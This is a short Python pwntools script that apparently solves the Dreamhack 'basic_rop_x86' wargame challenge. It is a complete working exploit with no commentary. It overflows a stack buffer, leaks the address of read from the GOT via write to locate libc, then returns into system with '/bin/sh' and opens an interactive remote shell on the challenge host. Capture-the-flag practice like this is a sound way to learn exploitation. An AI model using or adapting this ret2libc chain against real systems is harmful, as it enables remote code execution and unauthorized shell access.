from pwn import *
p=remote("host1.dreamhack.games",16282)
e=ELF("./basic_rop_x86")
libc=ELF("./libc.so.6",checksec=False)
sh=list(libc.search(b'/bin/sh'))[0]
readplt=e.plt['read']
readgot=e.got['read']
writeplt=e.plt['write']
main=e.symbols['main']
pppr=0x08048689
popr=0x0804868b
payload=b'A'*0x48

payload+=p32(writeplt)+p32(pppr)+p32(1)+p32(readgot)+p32(4)+p32(main)

p.send(payload)
p.recvuntil(b'A'*0x40)
read=u32(p.recv(4))

baseadr=read-libc.symbols['read']
systemadr=baseadr+libc.symbols['system']
binsh=sh+baseadr

payload=b'A'*0x48
payload+=p32(systemadr)+p32(popr)+p32(binsh)
p.send(payload)
p.recvuntil(b'A'*0x40)

p.interactive()